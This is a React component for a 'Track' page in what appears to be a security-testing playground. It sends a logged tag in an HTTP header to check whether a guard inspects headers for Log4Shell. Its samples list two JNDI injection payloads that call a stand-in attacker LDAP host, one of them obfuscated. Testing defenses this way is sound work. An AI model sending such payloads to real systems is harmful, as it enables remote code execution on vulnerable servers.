import Playground from '../components/Playground'
import { track } from '../api/client'

export default function Track() {
  return (
    <Playground
      title="Track"
      description="Record an access beacon. The tag you enter is sent in the X-Log-Tag header and logged. (Log4Shell sink — a logged value is expanded as a lookup. This one rides in a header, so it tests whether a guard inspects headers too.)"
      fields={[{ name: 'tag', label: 'Tag (sent as X-Log-Tag header)', placeholder: 'homepage-visit' }]}
      samples={[
        { label: '${jndi:ldap://…}', values: { tag: '${jndi:ldap://attacker/x}' } },
        { label: 'obfuscated', values: { tag: '${${lower:j}ndi:ldap://attacker/x}' } },
      ]}
      submitLabel="Send beacon"
      onSubmit={(v) => track(v.tag)}
    />
  )
}
